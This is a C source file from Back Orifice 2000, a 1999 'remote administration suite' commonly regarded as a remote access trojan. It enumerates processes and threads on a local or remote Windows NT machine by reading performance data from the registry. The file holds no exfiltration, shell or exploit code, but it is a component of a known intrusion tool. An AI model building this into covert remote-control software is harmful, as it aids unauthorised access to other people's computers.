/*  Back Orifice 2000 - Remote Administration Suite
    Copyright (C) 1999, Cult Of The Dead Cow

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

	The author of this program may be contacted at dildog@l0pht.com. */

#include <windows.h> 
#include <winperf.h> 
#include <perfdata.h> 
#include <pviewdat.h>
#include <nt_pviewer.h> 
#include <pviewer.h>
#include <string.h> 
#include <stdio.h> 

#define INDEX_STR_LEN       10 
#define MACHINE_NAME_LEN    MAX_COMPUTERNAME_LENGTH+2 
#define MACHINE_NAME_SIZE   MACHINE_NAME_LEN+1 

// Globals 

TCHAR           INDEX_PROCTHRD_OBJ[2*INDEX_STR_LEN]; 
TCHAR           INDEX_COSTLY_OBJ[3*INDEX_STR_LEN]; 

TCHAR           gszMachineName[MACHINE_NAME_SIZE]; 
TCHAR           gszCurrentMachine[MACHINE_NAME_SIZE]; 

DWORD           gPerfDataSize = 50*1024;            // start with 50K 
PPERF_DATA      gpPerfData; 

HKEY            ghPerfKey = HKEY_PERFORMANCE_DATA;  // get perf data from this key 
HKEY            ghMachineKey = HKEY_LOCAL_MACHINE;  // get title index from this key 



//  GetTitleIdx() - Searches Titles[] for Name.  Returns the index found. 

DWORD GetTitleIdx(LPTSTR Title[], DWORD LastIndex, LPTSTR Name) 
{ 
	DWORD   Index; 
	
	for (Index = 0; Index <= LastIndex; Index++) 
		if (Title[Index]) 
			if (!lstrcmpi (Title[Index], Name)) 
				return Index; 
			
	return 0; 
} 

//  SetPerfIndexes() - Setup the perf data indexes. 

int SetPerfIndexes(void) 
{ 
	LPTSTR  TitleBuffer; 
	LPTSTR  *Title; 
	DWORD   Last; 	
	
	if(GetPerfTitleSz (ghMachineKey, ghPerfKey, &TitleBuffer, &Title, &Last)!=ERROR_SUCCESS) return -1;	
	
	PX_PROCESS                       = GetTitleIdx (Title, Last, PN_PROCESS); 
	PX_PROCESS_CPU                   = GetTitleIdx (Title, Last, PN_PROCESS_CPU); 
	PX_PROCESS_PRIV                  = GetTitleIdx (Title, Last, PN_PROCESS_PRIV); 
	PX_PROCESS_USER                  = GetTitleIdx (Title, Last, PN_PROCESS_USER); 
	PX_PROCESS_WORKING_SET           = GetTitleIdx (Title, Last, PN_PROCESS_WORKING_SET); 
	PX_PROCESS_PEAK_WS               = GetTitleIdx (Title, Last, PN_PROCESS_PEAK_WS); 
	PX_PROCESS_PRIO                  = GetTitleIdx (Title, Last, PN_PROCESS_PRIO); 
	PX_PROCESS_ELAPSE                = GetTitleIdx (Title, Last, PN_PROCESS_ELAPSE); 
	PX_PROCESS_ID                    = GetTitleIdx (Title, Last, PN_PROCESS_ID); 
	PX_PROCESS_PRIVATE_PAGE          = GetTitleIdx (Title, Last, PN_PROCESS_PRIVATE_PAGE); 
	PX_PROCESS_VIRTUAL_SIZE          = GetTitleIdx (Title, Last, PN_PROCESS_VIRTUAL_SIZE); 
	PX_PROCESS_PEAK_VS               = GetTitleIdx (Title, Last, PN_PROCESS_PEAK_VS); 
	PX_PROCESS_FAULT_COUNT           = GetTitleIdx (Title, Last, PN_PROCESS_FAULT_COUNT); 
	
	PX_THREAD                        = GetTitleIdx (Title, Last, PN_THREAD); 
	PX_THREAD_CPU                    = GetTitleIdx (Title, Last, PN_THREAD_CPU); 
	PX_THREAD_PRIV                   = GetTitleIdx (Title, Last, PN_THREAD_PRIV); 
	PX_THREAD_USER                   = GetTitleIdx (Title, Last, PN_THREAD_USER); 
	PX_THREAD_START                  = GetTitleIdx (Title, Last, PN_THREAD_START); 
	PX_THREAD_SWITCHES               = GetTitleIdx (Title, Last, PN_THREAD_SWITCHES); 
	PX_THREAD_PRIO                   = GetTitleIdx (Title, Last, PN_THREAD_PRIO); 
	PX_THREAD_BASE_PRIO              = GetTitleIdx (Title, Last, PN_THREAD_BASE_PRIO); 
	PX_THREAD_ELAPSE                 = GetTitleIdx (Title, Last, PN_THREAD_ELAPSE); 
	PX_THREAD_ID                     = GetTitleIdx (Title, Last, PN_THREAD_ID); 
	
	PX_THREAD_DETAILS                = GetTitleIdx (Title, Last, PN_THREAD_DETAILS); 
	PX_THREAD_PC                     = GetTitleIdx (Title, Last, PN_THREAD_PC); 
	
	PX_IMAGE                         = GetTitleIdx (Title, Last, PN_IMAGE); 
	PX_IMAGE_NOACCESS                = GetTitleIdx (Title, Last, PN_IMAGE_NOACCESS); 
	PX_IMAGE_READONLY                = GetTitleIdx (Title, Last, PN_IMAGE_READONLY); 
	PX_IMAGE_READWRITE               = GetTitleIdx (Title, Last, PN_IMAGE_READWRITE); 
	PX_IMAGE_WRITECOPY               = GetTitleIdx (Title, Last, PN_IMAGE_WRITECOPY); 
	PX_IMAGE_EXECUTABLE              = GetTitleIdx (Title, Last, PN_IMAGE_EXECUTABLE); 
	PX_IMAGE_EXE_READONLY            = GetTitleIdx (Title, Last, PN_IMAGE_EXE_READONLY); 
	PX_IMAGE_EXE_READWRITE           = GetTitleIdx (Title, Last, PN_IMAGE_EXE_READWRITE); 
	PX_IMAGE_EXE_WRITECOPY           = GetTitleIdx (Title, Last, PN_IMAGE_EXE_WRITECOPY); 
	
	PX_PROCESS_ADDRESS_SPACE         = GetTitleIdx (Title, Last, PN_PROCESS_ADDRESS_SPACE); 
	PX_PROCESS_PRIVATE_NOACCESS      = GetTitleIdx (Title, Last, PN_PROCESS_PRIVATE_NOACCESS); 
	PX_PROCESS_PRIVATE_READONLY      = GetTitleIdx (Title, Last, PN_PROCESS_PRIVATE_READONLY); 
	PX_PROCESS_PRIVATE_READWRITE     = GetTitleIdx (Title, Last, PN_PROCESS_PRIVATE_READWRITE); 
	PX_PROCESS_PRIVATE_WRITECOPY     = GetTitleIdx (Title, Last, PN_PROCESS_PRIVATE_WRITECOPY); 
	PX_PROCESS_PRIVATE_EXECUTABLE    = GetTitleIdx (Title, Last, PN_PROCESS_PRIVATE_EXECUTABLE); 
	PX_PROCESS_PRIVATE_EXE_READONLY  = GetTitleIdx (Title, Last, PN_PROCESS_PRIVATE_EXE_READONLY); 
	PX_PROCESS_PRIVATE_EXE_READWRITE = GetTitleIdx (Title, Last, PN_PROCESS_PRIVATE_EXE_READWRITE); 
	PX_PROCESS_PRIVATE_EXE_WRITECOPY = GetTitleIdx (Title, Last, PN_PROCESS_PRIVATE_EXE_WRITECOPY); 
	
	PX_PROCESS_MAPPED_NOACCESS       = GetTitleIdx (Title, Last, PN_PROCESS_MAPPED_NOACCESS); 
	PX_PROCESS_MAPPED_READONLY       = GetTitleIdx (Title, Last, PN_PROCESS_MAPPED_READONLY); 
	PX_PROCESS_MAPPED_READWRITE      = GetTitleIdx (Title, Last, PN_PROCESS_MAPPED_READWRITE); 
	PX_PROCESS_MAPPED_WRITECOPY      = GetTitleIdx (Title, Last, PN_PROCESS_MAPPED_WRITECOPY); 
	PX_PROCESS_MAPPED_EXECUTABLE     = GetTitleIdx (Title, Last, PN_PROCESS_MAPPED_EXECUTABLE); 
	PX_PROCESS_MAPPED_EXE_READONLY   = GetTitleIdx (Title, Last, PN_PROCESS_MAPPED_EXE_READONLY); 
	PX_PROCESS_MAPPED_EXE_READWRITE  = GetTitleIdx (Title, Last, PN_PROCESS_MAPPED_EXE_READWRITE); 
	PX_PROCESS_MAPPED_EXE_WRITECOPY  = GetTitleIdx (Title, Last, PN_PROCESS_MAPPED_EXE_WRITECOPY); 
	
	PX_PROCESS_IMAGE_NOACCESS        = GetTitleIdx (Title, Last, PN_PROCESS_IMAGE_NOACCESS); 
	PX_PROCESS_IMAGE_READONLY        = GetTitleIdx (Title, Last, PN_PROCESS_IMAGE_READONLY); 
	PX_PROCESS_IMAGE_READWRITE       = GetTitleIdx (Title, Last, PN_PROCESS_IMAGE_READWRITE); 
	PX_PROCESS_IMAGE_WRITECOPY       = GetTitleIdx (Title, Last, PN_PROCESS_IMAGE_WRITECOPY); 
	PX_PROCESS_IMAGE_EXECUTABLE      = GetTitleIdx (Title, Last, PN_PROCESS_IMAGE_EXECUTABLE); 
	PX_PROCESS_IMAGE_EXE_READONLY    = GetTitleIdx (Title, Last, PN_PROCESS_IMAGE_EXE_READONLY); 
	PX_PROCESS_IMAGE_EXE_READWRITE   = GetTitleIdx (Title, Last, PN_PROCESS_IMAGE_EXE_READWRITE); 
	PX_PROCESS_IMAGE_EXE_WRITECOPY   = GetTitleIdx (Title, Last, PN_PROCESS_IMAGE_EXE_WRITECOPY); 
	
	
	wsprintf (INDEX_PROCTHRD_OBJ, TEXT("%ld %ld"), PX_PROCESS, PX_THREAD); 
	wsprintf (INDEX_COSTLY_OBJ, TEXT("%ld %ld %ld"), 
		PX_PROCESS_ADDRESS_SPACE, PX_IMAGE, PX_THREAD_DETAILS); 
	
	
	LocalFree (TitleBuffer); 
	LocalFree (Title); 
	
	return 0;
} 






//  SetLocalMachine() - Set local machine as performance data focus. 
//                      Sets ghPerfKey, ghMachineKey, gszMachineName, gszCurrentMachine 

void SetLocalMachine(void) 
{ 
	TCHAR   szName[MACHINE_NAME_SIZE]; 
	DWORD   dwSize = MACHINE_NAME_SIZE; 
	
	// close remote connections, if any 
	if (ghPerfKey!=HKEY_PERFORMANCE_DATA) RegCloseKey(ghPerfKey); 
	if (ghMachineKey!=HKEY_LOCAL_MACHINE) RegCloseKey(ghMachineKey); 
		
	// set to registry keys on local machine 
	ghPerfKey    = HKEY_PERFORMANCE_DATA; 
	ghMachineKey = HKEY_LOCAL_MACHINE; 
	
	// get computer name 
	GetComputerName (szName, &dwSize); 
	
	if (szName[0] != '\\' || szName[1] != '\\') { 
	    // must have two '\\' 
		wsprintf (gszMachineName, TEXT("\\\\%s"), szName); 
		lstrcpy (gszCurrentMachine, gszMachineName); 
	} else { 
		lstrcpy (gszMachineName, szName); 
		lstrcpy (gszCurrentMachine, gszMachineName); 
	} 
	
} 




//  ConnectComputer() - Connect to a computer with name entered in PVIEW_COMPUTER. 
//                      If a new connection is made, then return TRUE else return FALSE. 
//                      Sets gszCurrentMachine, ghPerfKey, and ghMachineKey

int NtProcList_ConnectComputer(char *svName) 
{ 
	HKEY    hKey; 
	TCHAR   szTemp[MACHINE_NAME_SIZE]; 
	BOOL    bResult = TRUE; 
	
	if(svName==NULL) {
		// Connect to local machine
		SetLocalMachine(); 
		SetPerfIndexes(); 
	
		return 0;
	}
	
	// Connect to remote machine 
	
	lstrcpyn(szTemp,svName,MACHINE_NAME_SIZE);
	
	if(RegConnectRegistry(szTemp, HKEY_PERFORMANCE_DATA, &hKey)!=ERROR_SUCCESS) return -1;
	
	lstrcpy(gszCurrentMachine, szTemp); 

	if(ghPerfKey!=HKEY_PERFORMANCE_DATA) RegCloseKey (ghPerfKey); 	
	ghPerfKey = hKey; 
		
	// we also need to get the remote machine's title indexes. 
	
	if (ghMachineKey != HKEY_LOCAL_MACHINE) RegCloseKey (ghMachineKey); 
			
	if (RegConnectRegistry (gszCurrentMachine, HKEY_LOCAL_MACHINE, &hKey) == ERROR_SUCCESS) 
		ghMachineKey = hKey; 
	else 
		ghMachineKey = HKEY_LOCAL_MACHINE; 

	SetPerfIndexes(); 
	return 0;
}


// RefreshPerfData() - Get a new set of performance data. pData should be NULL initially. 

PPERF_DATA RefreshPerfData (HKEY        hPerfKey, 
                            LPTSTR      szObjectIndex, 
                            PPERF_DATA  pData, 
                            DWORD       *pDataSize) 
{ 
    if (GetPerfData (hPerfKey, szObjectIndex, &pData, pDataSize) == ERROR_SUCCESS) 
        return pData; 
    else 
        return NULL; 
} 
 
// SetProcessListText() - Format the process list text. 

void SetProcessListText (PPERF_INSTANCE pInst, 
                         PPERF_COUNTER  pProcID, 
                         LPTSTR         svProcName,
						 DWORD			*pdwProcID) 
{ 	
	if(pProcID) { 		
		*pdwProcID = *(DWORD *)(CounterData (pInst, pProcID)); 
        wsprintf(svProcName, TEXT("%ls"), InstanceName(pInst));
	} 
    
} 

PROCESSINFO *NtProcList_BuildSnapShot(void)
{	
	PROCESSINFO *pProcCur;					// linked list
	THREADINFO *pThreadCur;					// linked list
	
	PPERF_OBJECT pObject;					// pointer to an object
	PPERF_COUNTER pCounterID; 				// pointer to a counter
	PPERF_INSTANCE pInstance;				// pointer to an instance
	int i,InstanceIndex;
	
	PROCESSINFO phd;

	// get performance data 
	gpPerfData=RefreshPerfData(ghPerfKey, INDEX_PROCTHRD_OBJ, gpPerfData, &gPerfDataSize); 
	
	// Start linked list
	phd.next=NULL;
	
	// --------------- Let's get information about processes
	pObject=FindObject(gpPerfData, PX_PROCESS); 
	
	// Get Process ID information
	pCounterID=FindCounter(pObject, PX_PROCESS_ID);

	pProcCur=&phd;
	pInstance=FirstInstance(pObject);
	InstanceIndex=0;
	while(pInstance && (InstanceIndex<pObject->NumInstances)) {
		// Add process to the list
		pProcCur->next=(PROCESSINFO *)malloc(sizeof(PROCESSINFO));
		if(pProcCur->next==NULL) return NULL;
		pProcCur=pProcCur->next;

		// Fill in info
		pProcCur->dwProcID=*(DWORD *)CounterData(pInstance,pCounterID);
		wsprintf(pProcCur->svApp,TEXT("%ls"), InstanceName(pInstance));
		pProcCur->pThread=NULL;

		// Go to next process instance
		pInstance=NextInstance(pInstance); 
		InstanceIndex++;
	}
	
	pProcCur->next=NULL;

	// --------------- Let's get information about threads
	pObject=FindObject(gpPerfData, PX_THREAD); 
	
	// Get Thread ID information
	pCounterID=FindCounter(pObject, PX_THREAD_ID);

	pInstance=FirstInstance (pObject);
	InstanceIndex=0;
	while(pInstance && (InstanceIndex<pObject->NumInstances)) {
		// Find process that is this thread's parent
		pProcCur=phd.next;
		for(i=0;i<(int)pInstance->ParentObjectInstance;i++) {
			pProcCur=pProcCur->next;
			if(pProcCur==NULL) break;
		}

		if(pProcCur!=NULL) {
			// Allocate thread info struct
			pThreadCur=(THREADINFO *)malloc(sizeof(THREADINFO));
			if(pThreadCur==NULL) return NULL;

			// Link into process info's list
			pThreadCur->next=pProcCur->pThread;
			pProcCur->pThread=pThreadCur;
		
			// Fill in data
			pThreadCur->dwThreadID=*(DWORD *)CounterData(pInstance,pCounterID);
		}
		

		pInstance=NextInstance(pInstance);
		InstanceIndex++;
	}
	
	return phd.next;
}
